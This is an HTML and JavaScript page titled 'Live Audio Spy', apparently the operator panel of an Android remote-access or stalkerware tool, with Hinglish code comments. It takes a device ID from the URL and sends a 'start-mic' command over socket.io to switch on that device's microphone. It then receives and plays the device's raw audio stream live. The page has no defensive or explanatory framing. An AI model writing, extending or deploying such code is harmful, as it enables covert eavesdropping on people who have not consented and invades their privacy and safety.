<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Audio Spy</title>
    <style>
        body {
            background-color: #1a1a1a;
            color: #0f0;
            font-family: 'Courier New', monospace;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
        }
        h2 { margin-bottom: 20px; }
        .visualizer {
            width: 80%;
            height: 100px;
            background: #000;
            border: 1px solid #0f0;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
        }
        .bar {
            width: 100%;
            height: 2px;
            background: #0f0;
            box-shadow: 0 0 10px #0f0;
            transition: height 0.1s;
        }
        button {
            padding: 15px 30px;
            font-size: 18px;
            background: #000;
            color: #0f0;
            border: 1px solid #0f0;
            cursor: pointer;
            font-weight: bold;
        }
        button:hover { background: #0f0; color: #000; }
        .status { margin-top: 10px; font-size: 14px; color: #aaa; }
    </style>
</head>
<body>

    <h2>ðŸ“¡ LIVE AUDIO STREAM</h2>
    
    <div class="visualizer">
        <div id="vis-bar" class="bar"></div>
    </div>

    <button id="btn-listen" onclick="startListening()">ðŸ”‡ CLICK TO START LISTENING</button>
    <p class="status" id="status-text">Waiting for connection...</p>

    <script src="/socket.io/socket.io.js"></script>

    <script>
        const socket = io();
        
        // URL se Device ID nikalo (Example: view_audio.html?id=DEVICE123)
        const urlParams = new URLSearchParams(window.location.search);
        const deviceID = urlParams.get('id');

        const statusText = document.getElementById("status-text");
        const btn = document.getElementById("btn-listen");
        const visBar = document.getElementById("vis-bar");

        let audioContext;
        let nextTime = 0;

        if (!deviceID) {
            statusText.innerText = "âŒ Error: No Device ID Found in URL";
        } else {
            // Join Room
            socket.emit("join", deviceID);
            statusText.innerText = `ðŸ”— Connected to: ${deviceID}`;
            
            // Command bhejo Android ko ki Mic chalu kare
            socket.emit("send-command", {
                targetId: deviceID,
                command: "start-mic" 
            });
        }

        function startListening() {
            if (!audioContext) {
                // Audio Context banau (Browser security ke liye click zaroori hai)
                audioContext = new (window.AudioContext || window.webkitAudioContext)({
                    sampleRate: 16000, // ðŸ”¥ Must match Android (16000Hz)
                });
                
                btn.innerText = "ðŸ”Š LISTENING...";
                btn.style.background = "#0f0";
                btn.style.color = "#000";
                statusText.innerText = "Receiving Audio Stream...";
            }
        }

        // ðŸ”¥ RECEIVE AUDIO FROM SERVER
        socket.on("audio-stream", (arrayBuffer) => {
            if (!audioContext) return; // Agar user ne click nahi kiya to ignore karo

            // Raw PCM Data (Int16) ko Float32 mein convert karo (WebAudio ke liye)
            const audioData = new Int16Array(arrayBuffer);
            const float32Data = new Float32Array(audioData.length);

            // Conversion Loop
            for (let i = 0; i < audioData.length; i++) {
                float32Data[i] = audioData[i] / 32768; // Convert -32768..32767 to -1.0..1.0
            }

            // Play Buffer
            playAudioChunk(float32Data);
            
            // Visualizer Effect (Fake but responsive)
            let volume = Math.abs(float32Data[0]) * 1000; 
            visBar.style.height = Math.min(volume, 100) + "px";
        });

        function playAudioChunk(float32Data) {
            const buffer = audioContext.createBuffer(1, float32Data.length, 16000);
            buffer.getChannelData(0).set(float32Data);

            const source = audioContext.createBufferSource();
            source.buffer = buffer;
            source.connect(audioContext.destination);

            // Seamless Playing Logic (Queue System)
            if (nextTime < audioContext.currentTime) {
                nextTime = audioContext.currentTime;
            }
            source.start(nextTime);
            nextTime += buffer.duration;
        }
    </script>
</body>
</html>
